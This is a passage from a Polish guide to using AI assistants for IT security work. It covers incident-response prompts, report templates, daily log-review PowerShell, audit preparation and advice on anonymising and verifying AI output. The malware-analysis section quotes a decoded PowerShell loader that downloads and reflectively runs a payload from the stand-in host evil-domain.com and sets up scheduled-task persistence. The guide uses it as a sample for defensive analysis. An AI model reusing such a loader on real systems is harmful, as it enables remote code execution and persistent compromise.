| **Wnioski** | Analiza post-mortem | Generowanie raportów, rekomendacje |

### Generowanie playbook'ów z AI

```
Stwórz playbook reagowania na incydent typu "Phishing z załącznikiem 
złośliwym" dla zespołu IT (3 osoby, brak dedykowanego SOC).

Playbook powinien zawierać:
1. Kryteria aktywacji (kiedy uruchomić procedurę)
2. Role i odpowiedzialności
3. Kroki krok po kroku (z komendami/narzędziami)
4. Drzewo decyzyjne (co jeśli użytkownik otworzył załącznik?)
5. Komunikacja (kogo powiadomić, szablony wiadomości)
6. Kryteria zamknięcia incydentu
7. Checklist post-mortem

Środowisko: Windows 10/11 endpoints, Microsoft 365, 
Windows Defender for Endpoint, Exchange Online.
Poziom zespołu: średniozaawansowany (nie są specjalistami security).
```

### Analiza złośliwego oprogramowania z AI

Uwaga: Nigdy nie wklejaj do AI prawdziwego kodu złośliwego oprogramowania w formie wykonywalnej. Możesz natomiast wkleić:
- Zdekodowane skrypty PowerShell/VBS
- Reguły YARA
- Hashe plików
- Zachowanie obserwowane w sandboxie
- Logi z detonacji

```
Przeanalizuj poniższy zdekodowany skrypt PowerShell znaleziony 
w zaplanowanym zadaniu na zainfekowanym serwerze. Określ:
1. Co robi skrypt (krok po kroku)
2. Jakie techniki MITRE ATT&CK wykorzystuje
3. IOC do ekstrakcji (IP, domeny, ścieżki plików, klucze rejestru)
4. Jak się rozprzestrzenia (jeśli dotyczy)
5. Rekomendacje dotyczące detekcji i blokowania

SKRYPT (zdekodowany z base64):
$c = New-Object System.Net.WebClient
$c.Headers.Add("User-Agent", "Mozilla/5.0")
$payload = $c.DownloadString("https://evil-domain.com/stage2.ps1")
$bytes = [Convert]::FromBase64String($payload)
$assembly = [Reflection.Assembly]::Load($bytes)
$method = $assembly.GetType("Loader").GetMethod("Run")
$method.Invoke($null, @("cmd.exe", "/c whoami > C:\temp\info.txt"))
# Persistence
$trigger = New-ScheduledTaskTrigger -AtStartup
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-enc [base64encoded]"
Register-ScheduledTask -TaskName "SystemUpdate" -Trigger $trigger `
    -Action $action -RunLevel Highest
```

### Generowanie raportów z incydentów

Po rozwiązaniu incydentu, AI pomaga stworzyć profesjonalny raport:

```
Na podstawie poniższych notatek z incydentu, wygeneruj formalny 
raport post-mortem w formacie zgodnym z ISO 27035.

NOTATKI:
- Data wykrycia: 2024-03-18, 8:00
- Kto wykrył: Jan Kowalski (admin), zauważył zaszyfrowane pliki
- Wektor ataku: phishing email do pracownika HR (2024-03-15)
- Załącznik: faktura.xlsm z makrem pobierającym Cobalt Strike
- Lateral movement: z PC pracownika HR do file servera (konto admin)
- Wpływ: 2TB plików zaszyfrowanych, 4h przestoju
- Rozwiązanie: restore z backupu (piątkowy backup OK)
- Okup: nie zapłacono
- Czas do wykrycia: 3 dni
- Czas do rozwiązania: 8 godzin

Format: profesjonalny raport w języku polskim, 
z sekcjami: streszczenie, oś czasu, analiza przyczyn, 
wpływ biznesowy, podjęte działania, rekomendacje, lekcje.
```

## Praktyczne workflow bezpieczeństwa z AI

### Codzienny przegląd bezpieczeństwa (15 minut)

Oto workflow, który możesz wykonywać codziennie rano, wykorzystując AI do przyspieszenia analizy:

**1. Eksport kluczowych logów (5 minut):**
```powershell
# Skrypt do codziennego eksportu logów bezpieczeństwa
$yesterday = (Get-Date).AddDays(-1)

# Nieudane logowania
$failedLogons = Get-WinEvent -FilterHashtable @{
    LogName='Security'; Id=4625; StartTime=$yesterday
} | Measure-Object | Select-Object -ExpandProperty Count

# Nowe konta
$newAccounts = Get-WinEvent -FilterHashtable @{
    LogName='Security'; Id=4720; StartTime=$yesterday
} -ErrorAction SilentlyContinue

# Zmiany w grupach uprzywilejowanych
$groupChanges = Get-WinEvent -FilterHashtable @{
    LogName='Security'; Id=4732,4728,4756; StartTime=$yesterday
} -ErrorAction SilentlyContinue

# Wyczyszczone logi (podejrzane!)
$clearedLogs = Get-WinEvent -FilterHashtable @{
    LogName='Security'; Id=1102; StartTime=$yesterday
} -ErrorAction SilentlyContinue

Write-Host "=== Raport bezpieczeństwa za ostatnie 24h ==="
Write-Host "Nieudane logowania: $failedLogons"
Write-Host "Nowe konta: $($newAccounts.Count)"
Write-Host "Zmiany w grupach: $($groupChanges.Count)"
Write-Host "Wyczyszczone logi: $($clearedLogs.Count)"
```

**2. Analiza z AI (5 minut):**
Wklej wyniki do AI z pytaniem: „Czy coś w tych danych wymaga mojej uwagi?"

**3. Działania (5 minut):**
Na podstawie rekomendacji AI — zablokuj IP, zresetuj hasła, eskaluj do zespołu.

### Tygodniowy przegląd podatności

```
Oto wyniki tygodniowego skanowania podatności. 
Porównaj z wynikami z poprzedniego tygodnia i wskaż:
1. Nowe podatności (pojawiły się w tym tygodniu)
2. Naprawione podatności (były tydzień temu, teraz ich nie ma)
3. Podatności, które powinny być naprawione ale nie są (>30 dni)
4. Trend ogólny (poprawa/pogorszenie)

WYNIKI BIEŻĄCY TYDZIEŃ:
[dane ze skanera]

WYNIKI POPRZEDNI TYDZIEŃ:
[dane ze skanera]
```

### Przygotowanie do audytu bezpieczeństwa

```
Przygotowuję się do audytu bezpieczeństwa ISO 27001. 
Na podstawie poniższej listy kontroli, które mamy wdrożone, 
zidentyfikuj luki i zaproponuj szybkie działania naprawcze 
(quick wins) możliwe do wdrożenia w 2 tygodnie.

WDROŻONE KONTROLE:
- Firewall perimetrowy (Cisco ASA)
- Antywirus na endpointach (Windows Defender)
- Backup codzienny (Veeam)
- VPN dla zdalnego dostępu
- Active Directory z GPO
- Monitoring Zabbix (dostępność)

BRAKUJĄCE/NIEPEWNE:
- MFA (tylko dla VPN, nie dla wszystkich systemów)
- SIEM (brak)
- Zarządzanie podatnościami (ad hoc, nie regularne)
- Polityka haseł (8 znaków, zmiana co 90 dni)
- Szkolenia security awareness (ostatnie rok temu)
- Klasyfikacja danych (brak formalnej)
- Plan ciągłości działania (nieaktualny)

Dla każdej luki podaj:
1. Ryzyko (wysokie/średnie/niskie)
2. Quick win (co można zrobić w 1-2 tygodnie)
3. Rozwiązanie docelowe (długoterminowe)
4. Szacunkowy koszt (niski/średni/wysoki)
```

## Ograniczenia i ryzyka stosowania AI w bezpieczeństwie

### Czego NIE powinieneś robić z AI w kontekście bezpieczeństwa

1. **Nie wklejaj prawdziwych danych wrażliwych do publicznych narzędzi AI** — hasła, klucze API, dane osobowe klientów, szczegóły infrastruktury produkcyjnej nie powinny trafiać do ChatGPT czy Claude. Używaj wersji enterprise z gwarancją prywatności danych lub anonimizuj dane przed wklejeniem.

2. **Nie ufaj AI bezgranicznie** — AI może generować fałszywe IOC, błędne analizy, lub pomijać subtelne wskaźniki ataku. Zawsze weryfikuj krytyczne ustalenia.

3. **Nie automatyzuj działań blokujących bez nadzoru** — AI może zasugerować zablokowanie IP, które okaże się adresem ważnego partnera biznesowego. Automatyzacja powinna mieć „human in the loop" dla krytycznych akcji.

4. **Nie polegaj wyłącznie na AI w compliance** — AI może pomóc przygotować dokumentację, ale audytor będzie wymagał dowodów rzeczywistego wdrożenia kontroli.

5. **Nie używaj AI do tworzenia narzędzi ofensywnych** — nawet w celach testowych, tworzenie exploitów czy malware z pomocą AI jest nieetyczne i potencjalnie nielegalne.

### Anonimizacja danych przed analizą AI

Zanim wkleisz logi do AI, zanonimizuj dane wrażliwe:

```powershell
# Skrypt do anonimizacji logów przed analizą AI
$logContent = Get-Content "C:\Logs\security.csv"

# Zamień prawdziwe IP wewnętrzne na fikcyjne
$logContent = $logContent -replace '192\.168\.1\.(\d+)', '10.0.1.$1'

# Zamień nazwy użytkowników na generyczne
$logContent = $logContent -replace 'jan\.kowalski', 'user01'
$logContent = $logContent -replace 'anna\.nowak', 'user02'

# Zamień nazwy serwerów
$logContent = $logContent -replace 'SRV-PROD-SQL01', 'SERVER-DB-01'
$logContent = $logContent -replace 'DC-MAIN', 'SERVER-AD-01'

# Zapisz zanonimizowane logi
$logContent | Set-Content "C:\Logs\security_anonymized.csv"
```

### Weryfikacja wyników AI

Zawsze stosuj zasadę „trust but verify":

- **Sprawdź IOC w publicznych bazach** — VirusTotal, AbuseIPDB, OTX AlienVault
- **Zweryfikuj CVE** — sprawdź na nvd.nist.gov czy podatność dotyczy Twojej wersji
- **Potwierdź rekomendacje** — czy sugerowana reguła firewall nie zablokuje legalnego ruchu
- **Testuj skrypty** — uruchom najpierw w środowisku testowym

## Narzędzia AI dedykowane bezpieczeństwu

### Przegląd dostępnych narzędzi

| Narzędzie | Typ | Zastosowanie | Cena |
|-----------|-----|--------------|------|
| Microsoft Copilot for Security | Zintegrowany z M365 | Analiza incydentów, threat hunting | Enterprise (drogi) |
| ChatGPT/Claude | Ogólne LLM | Analiza logów, generowanie skryptów | Darmowy/Pro |
| GitHub Copilot | Asystent kodu | Pisanie skryptów security | $10-19/mies. |
| Darktrace | Dedykowany AI security | Wykrywanie anomalii w sieci | Enterprise |
| CrowdStrike Charlotte AI | Endpoint security | Analiza zagrożeń endpoint | Enterprise |
| Elastic AI Assistant | SIEM | Analiza w Elastic SIEM | Wliczone w licencję |

### Kiedy używać ogólnego AI vs. dedykowanych narzędzi

**Ogólne AI (ChatGPT, Claude) — dobre do:**
- Analizy wyeksportowanych logów
- Generowania skryptów i reguł
- Tworzenia dokumentacji bezpieczeństwa
- Nauki i zrozumienia koncepcji
- Priorytetyzacji podatności
- Pisania raportów

**Dedykowane narzędzia AI — lepsze gdy:**
- Potrzebujesz analizy w czasie rzeczywistym
- Pracujesz z dużymi wolumenami danych (TB logów)
- Wymagasz integracji z istniejącymi systemami
- Potrzebujesz automatycznej reakcji (SOAR)
- Compliance wymaga audytowalności decyzji AI

## Podsumowanie

AI w bezpieczeństwie IT to nie przyszłość — to teraźniejszość. Nawet bez dedykowanych, drogich narzędzi enterprise, możesz już dziś wykorzystać ogólnodostępne modele AI do:

1. **Przyspieszenia analizy logów** — z godzin do minut
2. **Wykrywania wzorców ataków** — korelacja zdarzeń z wielu źródeł
3. **Priorytetyzacji zagrożeń** — skupienie się na tym, co naprawdę ważne
4. **Automatyzacji rutynowych zadań** — skrypty monitorujące, reguły firewall
5. **Reagowania na incydenty** — szybsza analiza, lepsze raporty
6. **Przygotowania do audytów** — identyfikacja luk, generowanie dokumentacji

Kluczowe zasady:
- **Anonimizuj dane** przed wklejeniem do publicznych narzędzi AI
- **Weryfikuj wyniki** — AI jest asystentem, nie wyrocznia
- **Automatyzuj z rozwagą** — krytyczne akcje wymagają ludzkiej decyzji
- **Ucz się ciągle** — krajobraz zagrożeń zmienia się codziennie

W następnym rozdziale pokażemy, jak zintegrować AI w codziennym workflow pracy IT — od porannego przeglądu po zarządzanie wiedzą w zespole.
